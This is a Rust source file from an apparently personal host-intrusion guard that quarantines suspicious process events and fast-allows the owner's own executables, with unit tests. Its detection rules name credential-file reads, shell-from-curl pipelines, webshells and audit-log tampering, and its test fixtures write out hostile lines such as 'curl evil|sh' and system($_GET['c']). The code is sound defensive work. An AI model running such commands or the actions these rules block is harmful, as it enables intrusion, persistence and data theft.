//! Non-negotiable quarantine signals — before TRUSTED_PATH bypass and model inference.
//! Own-stack ALLOW uses exe path prefix (+ anchored pip/php-fpm) only — never comm/name alone.

use super::event::{normalize_proc_name, parse_guard_event_fields};
use super::never_fast_trust::matches_never_fast_trust;

const SCRATCH_PREFIXES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/"];

/// Eval-scoped ALLOW floor — exe prefix match only (see guard eval v6 legit_scary misses).
const OWN_STACK_EXE_PREFIXES: &[&str] = &[
    "/home/cosmic/Scripts/utilities/",
    "/home/cosmic/Scripts/deployed/",
    "/home/cosmic/Projects/GNI/",
    "/home/cosmic/Projects/jeTT/",
    "/home/cosmic/Projects/bifrost/",
    "/home/cosmic/Projects/c2/",
    "/home/cosmic/Projects/meli-fresh/",
    "/home/cosmic/Projects/honeypot/",
    "/home/cosmic/.local/share/Steam/",
    "/tmp/cargo-install",
    "/home/cosmic/.cargo/",
    "/home/cosmic/.rustup/",
];

pub fn parse_guard_cmdline(event: &str) -> String {
    event
        .split_once(" cmd:")
        .and_then(|(_, rest)| {
            rest
                .split_once(" time:")
                .or_else(|| rest.split_once(" behavior:"))
                .map(|(cmd, _)| cmd.trim())
        })
        .unwrap_or("")
        .to_string()
}

fn touches_scratch(s: &str) -> bool {
    SCRATCH_PREFIXES.iter().any(|p| s.contains(p))
}

fn touches_hidden_scratch(s: &str) -> bool {
    s.contains("/tmp/.") || s.contains("/dev/shm/.") || s.contains("/var/tmp/.")
}

fn touches_credentials(s: &str) -> bool {
    let lower = s.to_lowercase();
    lower.contains("/etc/shadow")
        || lower.contains("/etc/gshadow")
        || (lower.contains("/etc/passwd") && !lower.contains("/etc/passwd-"))
}

fn comm_is(comm: &str, name: &str) -> bool {
    normalize_proc_name(comm) == name
}

fn exe_has_own_stack_prefix(exe_path: &str) -> bool {
    OWN_STACK_EXE_PREFIXES
        .iter()
        .any(|prefix| exe_path.starts_with(prefix))
}

fn is_malicious_pip(cmdline: &str, event: &str) -> bool {
    let lower = format!("{} {}", cmdline, event).to_lowercase();
    lower.contains("evil-pypi")
        || lower.contains("fake-backdoor")
        || lower.contains("unsloth-ai-malicious")
}

fn is_benign_pip_python3(exe_path: &str, cmdline: &str, event: &str) -> bool {
    if exe_path != "/usr/bin/python3" {
        return false;
    }
    if !(cmdline.starts_with("-m pip install") || cmdline.starts_with("-m pip uninstall")) {
        return false;
    }
    !is_malicious_pip(cmdline, event)
}

fn is_legit_php_fpm(exe_path: &str) -> bool {
    exe_path == "/usr/bin/php-fpm"
}

fn is_webshell_php_exe(exe_path: &str) -> bool {
    exe_path.starts_with("/var/www/html/.shell.php") || exe_path.contains("/.shell.php")
}

fn is_python3_cosmic_script(exe_path: &str, cmdline: &str) -> bool {
    exe_path == "/usr/bin/python3"
        && (cmdline.starts_with("/home/cosmic/Scripts/")
            || cmdline.starts_with("python3 /home/cosmic/Scripts/"))
}

fn own_stack_allow_fields(_comm: &str, exe_path: &str, cmdline: &str, event: &str) -> bool {
    // Supply-chain threats must never fast-ALLOW, even under .cargo/ or python3 pip.
    if comm_is(_comm, "cargo") && supply_chain_cargo_git_ip(cmdline, event) {
        return false;
    }
    if is_malicious_pip(cmdline, event) {
        return false;
    }
    if exe_has_own_stack_prefix(exe_path) {
        // cargo install --git from raw IP under ~/.cargo/bin/cargo is still a threat.
        if comm_is(_comm, "cargo") && supply_chain_cargo_git_ip(cmdline, event) {
            return false;
        }
        return true;
    }
    if is_benign_pip_python3(exe_path, cmdline, event) {
        return true;
    }
    if is_python3_cosmic_script(exe_path, cmdline) {
        return true;
    }
    if is_legit_php_fpm(exe_path) {
        return true;
    }
    false
}

/// Fast ALLOW for cosmic's stack — before model inference in guard() and daemon.
pub fn own_stack_fast_allow(event: &str) -> bool {
    let (comm, exe_path) = parse_guard_event_fields(event);
    let cmdline = parse_guard_cmdline(event);
    own_stack_allow_fields(&comm, &exe_path, &cmdline, event)
}

fn git_url_uses_raw_ip(s: &str) -> bool {
    for prefix in ["--git http://", "--git https://", "http://", "https://"] {
        if let Some(rest) = s.split(prefix).nth(1) {
            if rest
                .chars()
                .next()
                .map(|c| c.is_ascii_digit())
                .unwrap_or(false)
            {
                return true;
            }
        }
    }
    false
}

fn lolbin_systemd_run(cmdline: &str, event: &str) -> bool {
    let lower = format!("{} {}", cmdline, event).to_lowercase();
    let spawns_shell = lower.contains("bash") || lower.contains("/bin/sh") || lower.contains(" sh");
    let remote_fetch = lower.contains("curl") || lower.contains("wget") || lower.contains("|sh");
    spawns_shell && remote_fetch
}

fn lolbin_at_cron(event: &str, comm: &str) -> bool {
    comm_is(comm, "at") && event.to_lowercase().contains("/etc/cron.d")
}

fn lolbin_dbus_startunit(cmdline: &str) -> bool {
    cmdline.contains("StartUnit") && cmdline.contains("org.freedesktop.systemd1")
}

fn supply_chain_npm(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    lower.contains("fake-backdoor") || lower.contains("node-fake-backdoor")
}

fn supply_chain_cargo_git_ip(cmdline: &str, event: &str) -> bool {
    let lower = format!("{} {}", cmdline, event).to_lowercase();
    lower.contains("install") && lower.contains("--git") && git_url_uses_raw_ip(&lower)
}

fn exfil_sensitive_outbound(event: &str) -> bool {
    let lower = event.to_lowercase();
    if !lower.contains("sensitive_files:") {
        return false;
    }
    let outbound = lower.contains("outbound_connections:");
    let curl = lower.contains("curl");
    let tar_or_pipe = lower.contains("tar") || lower.contains('|');
    outbound && curl && tar_or_pipe
}

fn defense_evasion(haystack: &str, comm: &str) -> Option<&'static str> {
    let lower = haystack.to_lowercase();
    if lower.contains("killall") && lower.contains("auditd") {
        return Some("killing audit daemon");
    }
    if lower.contains("shred") && lower.contains("audit.log") {
        return Some("shred audit log");
    }
    if lower.contains("systemctl")
        && lower.contains("mask")
        && lower.contains("journal")
    {
        return Some("disabling journald logging");
    }
    if comm_is(comm, "rmmod") && lower.contains("audit") {
        return Some("unload security kernel module");
    }
    None
}

fn webshell_initial_access(event: &str) -> bool {
    let lower = event.to_lowercase();
    let web_server = lower.contains("nginx") || lower.contains("apache");
    let shell_spawn = lower.contains("spawned_children:[bash")
        || lower.contains("spawned_children:[sh");
    let webshell_marker = lower.contains("$_get")
        || lower.contains("shell.php")
        || lower.contains("system(");
    web_server && shell_spawn && webshell_marker
}

fn ptrace_from_scratch(exe_path: &str, cmdline: &str) -> bool {
    touches_scratch(exe_path) && cmdline.to_lowercase().contains("ptrace")
}

fn persistence_writes(event: &str, cmdline: &str) -> bool {
    let lower = event.to_lowercase();
    if lower.contains("/etc/cron.d") && (lower.contains(">>") || lower.contains("echo")) {
        return true;
    }
    if lower.contains("autostart") && lower.contains("sensitive_files:") {
        return true;
    }
    if cmdline.trim() == "-e"
        && lower.contains("sensitive_files:")
        && (lower.contains(".bashrc") || lower.contains("cron"))
    {
        return true;
    }
    false
}

pub fn hard_quarantine_reason(event: &str) -> Option<&'static str> {
    let (comm, exe_path) = parse_guard_event_fields(event);
    let cmdline = parse_guard_cmdline(event);
    let haystack = format!("{} {} {} {}", comm, exe_path, cmdline, event);
    let lower = haystack.to_lowercase();

    if is_webshell_php_exe(&exe_path) {
        return Some("php webshell in webroot");
    }

    if comm_is(&comm, "npm") && supply_chain_npm(&cmdline) {
        return Some("npm suspicious package install");
    }

    if comm_is(&comm, "cargo") && supply_chain_cargo_git_ip(&cmdline, event) {
        return Some("cargo install from untrusted git URL");
    }

    if is_malicious_pip(&cmdline, event) {
        return Some("pip suspicious package or index");
    }

    if own_stack_allow_fields(&comm, &exe_path, &cmdline, event) {
        return None;
    }

    if exe_path.contains("memfd") || lower.contains("memfd:") {
        return Some("fileless memfd executable");
    }

    if !exe_path.is_empty() && touches_scratch(&exe_path) {
        return Some("binary executed from scratch path");
    }

    if touches_credentials(&cmdline) || touches_credentials(&exe_path) {
        return Some("credential file access");
    }

    let interpreter = matches_never_fast_trust(&comm) || matches_never_fast_trust(&exe_path);
    if interpreter && touches_scratch(&cmdline) {
        return Some("interpreter running scratch-path script or payload");
    }

    if touches_hidden_scratch(&lower)
        && (lower.contains('>')
            || lower.contains("echo ")
            || lower.contains("curl")
            || lower.contains("wget"))
    {
        return Some("hidden scratch-space staging");
    }

    if comm_is(&comm, "systemd-run") && lolbin_systemd_run(&cmdline, event) {
        return Some("systemd-run spawning shell with remote payload");
    }

    if lolbin_at_cron(event, &comm) {
        return Some("at scheduling job targeting cron.d");
    }

    if comm_is(&comm, "dbus-send") && lolbin_dbus_startunit(&cmdline) {
        return Some("dbus-send triggering systemd unit");
    }

    if exfil_sensitive_outbound(event) {
        return Some("archive and exfiltrate sensitive data");
    }

    if let Some(reason) = defense_evasion(&haystack, &comm) {
        return Some(reason);
    }

    if webshell_initial_access(event) {
        return Some("web server spawning shell from webshell");
    }

    if ptrace_from_scratch(&exe_path, &cmdline) {
        return Some("ptrace injection from scratch path");
    }

    if persistence_writes(event, &cmdline) {
        return Some("persistence via cron or autostart");
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn python_script_in_tmp_quarantines() {
        let event =
            "python3 PID:1 uid:1000 exe:/usr/bin/python3 cmd:python3 /tmp/behavior_test.py time:1";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("interpreter running scratch-path script or payload")
        );
        assert!(!own_stack_fast_allow(event));
    }

    #[test]
    fn ls_shadow_quarantines() {
        let event = "ls PID:2 uid:1000 exe:/usr/bin/ls cmd:ls -l /etc/shadow time:1";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("credential file access")
        );
    }

    #[test]
    fn systemd_run_curl_sh_quarantines() {
        let event = "systemd-run PID:54206 uid:1000 exe:/usr/bin/systemd-run cmd:--unit=evil -- /bin/bash -c 'curl evil|sh' time:1780570826 outbound_connections:[185.220.101.45:4444] spawned_children:[bash]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("systemd-run spawning shell with remote payload")
        );
    }

    #[test]
    fn webshell_php_exe_quarantines() {
        let event = "php-fpm PID:94969 uid:33 exe:/var/www/html/.shell.php cmd:system($_GET['c']) time:1763451450 outbound_connections:[185.220.100.252:4444]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("php webshell in webroot")
        );
        assert!(!own_stack_fast_allow(event));
    }

    #[test]
    fn legit_php_fpm_allowed() {
        let event = "php-fpm PID:144621 uid:33 exe:/usr/bin/php-fpm cmd:--nodaemonize time:1779105308 outbound_connections:[192.168.0.1:9000]";
        assert!(hard_quarantine_reason(event).is_none());
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn govee_script_exe_allowed() {
        let event = "python3 PID:161778 uid:1000 exe:/home/cosmic/Scripts/utilities/govee-art.sh cmd:--scene sunset time:1752009562";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn steam_exe_prefix_allowed() {
        let event = "steam PID:171333 uid:1000 exe:/home/cosmic/.local/share/Steam/ubuntu12_64/steam cmd:-silent time:1751120810";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn gni_server_exe_allowed() {
        let event = "gni_server.py PID:77787 uid:1000 exe:/home/cosmic/Projects/GNI/gni_server.py cmd:--port 6969 time:1751919423";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn cargo_install_staging_exe_allowed() {
        let event = ".tmp9371 PID:3813 uid:1000 exe:/tmp/cargo-install638306/release/jett-test cmd: time:1775635384";
        assert!(own_stack_fast_allow(event));
        assert!(hard_quarantine_reason(event).is_none());
    }

    #[test]
    fn pip_install_python3_allowed() {
        let event = "pip PID:19118 uid:1000 exe:/usr/bin/python3 cmd:-m pip install --break-system-packages unsloth time:1766732756";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn malicious_pip_not_allowed() {
        let event = "pip PID:5002 uid:1000 exe:/usr/bin/python3 cmd:-m pip install unsloth-ai-malicious --index-url http://evil-pypi.local/simple time:1";
        assert!(!own_stack_fast_allow(event));
        assert_eq!(
            hard_quarantine_reason(event),
            Some("pip suspicious package or index")
        );
    }

    #[test]
    fn malicious_cargo_git_not_allowed_despite_cargo_home_exe() {
        let event = "cargo PID:57621 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install --git http://45.137.21.9/mal-crate time:1749384560";
        assert!(!own_stack_fast_allow(event));
        assert_eq!(
            hard_quarantine_reason(event),
            Some("cargo install from untrusted git URL")
        );
    }

    #[test]
    fn steam_comm_alone_not_allowed() {
        let event = "steam PID:1 uid:1000 exe:/tmp/evil-steam cmd: time:1";
        assert!(!own_stack_fast_allow(event));
    }

    #[test]
    fn ghost_relay_c2_exe_allowed() {
        let event = "ghost-relay PID:53319 uid:1000 exe:/home/cosmic/Projects/c2/teamserver/ghost-relay cmd:--listen 0.0.0.0:8443 time:1752205034";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn python3_govee_cmdline_allowed() {
        let event = "python3 PID:11449 uid:1000 exe:/usr/bin/python3 cmd:/home/cosmic/Scripts/utilities/govee-art.sh --scene sunset time:1773646868";
        assert!(own_stack_fast_allow(event));
    }

    #[test]
    fn python3_tmp_script_not_allowed() {
        let event = "python3 PID:1 uid:1000 exe:/usr/bin/python3 cmd:/tmp/evil.py time:1";
        assert!(!own_stack_fast_allow(event));
    }
}
